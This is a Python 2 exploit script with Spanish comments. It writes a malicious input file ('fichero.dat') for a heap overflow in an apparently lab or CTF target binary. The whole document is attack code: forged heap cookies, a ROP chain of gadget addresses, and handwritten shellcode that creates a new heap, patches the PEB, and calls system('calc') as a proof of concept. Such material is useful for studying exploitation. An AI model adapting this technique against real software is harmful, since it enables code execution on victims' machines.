import struct

firstByte = "\xFF"
cookie2 = struct.pack("<I", 0x45464748)
cookie1 = struct.pack("<I", 0x25262728)

alignChunkHeader = "\x90" * 4
jmpRopChain = "\x83\xC1\x60\xFF\xD1" 	# 5 bytes
ropJunk = "\x90"*27 					# 27 bytes + 5 de jmpRopChain + 4 de alignChunkHeader = 36 bytes

rop1 = "JUNK"							# basura para colocar en ebp
rop2 = struct.pack("<I", 0x10101768)	# mov eax, edx; pop esi; pop ebp; ret => colocamos en eax el valor de edx
rop3 = "JUNK"							# basura para pop esi
rop4 = "JUNK"							# basura para pop ebp
rop5 = struct.pack("<I", 0x10101990)	# dec eax => resto 1 a eax
rop6 = "JUNK"							# basura para ebp
rop7 = struct.pack("<I", 0x10101990)	# dec eax => resto 2 a eax
rop8 = struct.pack("<I", 0x10101010)	# INDIRECCION NECESARIA PARA NO ROMPER SYSTEM
rop9 = struct.pack("<I", 0x10101990)	# dec eax => resto 3 a eax
rop10 = "JUNK"							# basura para ebp
rop11 = struct.pack("<I", 0x10101990)	# dec eax => resto 4 a eax
rop12 = "JUNK"							# basura para ebp
rop13 = struct.pack("<I", 0x101012F7)	# mov ecx, [eax+24] = [edx+20]

ropChain = alignChunkHeader+jmpRopChain+ropJunk+rop1+rop2+rop3+rop4+rop5+rop6+rop7+rop8+rop9+rop10+rop11+rop12+rop13

nopHeader = "\x90"*12
#E8 87 03 00 00
#HeapCreate => 37 Bytes
#mov esi, [10103000]
#sub esi, 3EC0
#add esi, 9BF0 => HeapCreate
#push 1000
#push 1000
#push 40000
#call esi
#mov edx, eax

#7632231A
#7631F124 HeapCreate
#7631872A

heapCreate = "\x8B\x35\x00\x30\x10\x10\x81\xEE\xC0\x3E\x00\x00\x81\xC6\xFA\x69\x00\x00\x68\x00\x10\x00\x00\x68\x00\x10\x00\x00\x68\x00\x00\x04\x00\xFF\xD6\x89\xC2"

# Heap Substitution in PEB
# mov EAX to PEB
# mov edx, fs[30]
# mov [edx+18], eax #change heap in peg
heapFix = "\x64\x8B\x15\x30\x00\x00\x00\x89\x42\x18"
		 
#Obtengo y llamo a System
#mov esi, [10103064] ucrtbase.malloc
#sub esi, 35E50
#add esi, B9E40
#PUSH 636c6163 #clac
#POP EAX
#MOV [10104446], EAX
#push 10104446
#call esi
system = "\x8B\x35\x64\x30\x10\x10\x81\xEE\x50\x5E\x03\x00\x81\xC6\x40\x9E\x0B\x00\x68\x63\x61\x6C\x63\x58\xA3\x46\x44\x10\x10\x68\x46\x44\x10\x10\xFF\xD6"

shellcode = nopHeader+heapCreate+heapFix+system

junk1 = "\x41" * (5996-(len(ropChain)+len(shellcode)))
callEAX = struct.pack("<I", 0x10101D29) # pop esp, 18; pop ebp, ret => Esto es para llegar de call eax a nuestra payload en el stack
junk2 = "\x42" * 5
secByte = "\x80"
junk3  = "\x43" * 22

payload = firstByte+cookie2+cookie1+ropChain+shellcode+junk1+callEAX+junk2+secByte+junk3

f = open("fichero.dat", "w")
f.write(payload)
f.close()

print "Done!"